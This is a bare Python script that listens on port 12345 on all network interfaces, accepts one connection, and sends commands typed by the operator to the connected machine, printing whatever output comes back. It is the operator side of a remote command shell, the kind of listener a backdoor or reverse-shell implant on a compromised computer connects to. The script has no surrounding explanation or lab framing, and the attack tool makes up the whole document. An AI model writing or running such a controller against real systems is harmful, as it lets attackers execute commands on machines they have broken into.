import socket
import subprocess

HOST = '0.0.0.0'  # Listen on all network interfaces
PORT = 12345  # Choose a port number
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
print(f"Listening on {HOST}:{PORT}")
conn, addr = s.accept()
print(f"Connection from {addr}")

while True:
    command = input("Enter command to execute or 'exit' to quit: ")
    if command.lower() == 'exit':
        conn.send(b'exit')
        conn.close()
        break
    conn.send(command.encode())
    output = conn.recv(1024)
    print(output.decode(), end="")
s.close()
